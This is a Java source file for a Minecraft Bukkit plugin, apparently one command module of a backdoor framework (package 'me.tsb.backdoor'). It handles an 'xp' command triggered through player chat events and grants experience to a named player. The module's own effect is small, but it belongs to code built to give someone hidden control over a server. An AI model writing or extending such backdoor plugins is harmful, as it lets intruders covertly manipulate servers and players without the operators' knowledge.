package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "experience", aliases = {"xp"})
public class XPCommand extends Command {

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Player player;
        try {
            player = Bukkit.getPlayer(args.get(1));
        } catch (Exception e) {
            Main.logger.log("Failed to get player in arg nr 1.");
            return;
        }

        int xp = 0;
        try {
            xp = Integer.parseInt(args.get(2));
        } catch (Exception e) {
            Main.logger.log("Failed to set xp amount, defaulting to 0");
        }

        try {
            player.giveExp(xp);
            player.sendMessage("Gave " + player.getName() + xp + " xp");
        } catch (Exception e) {
            Main.logger.log("Failed to give " + player.getName() + xp + " xp");
        }
    }
}
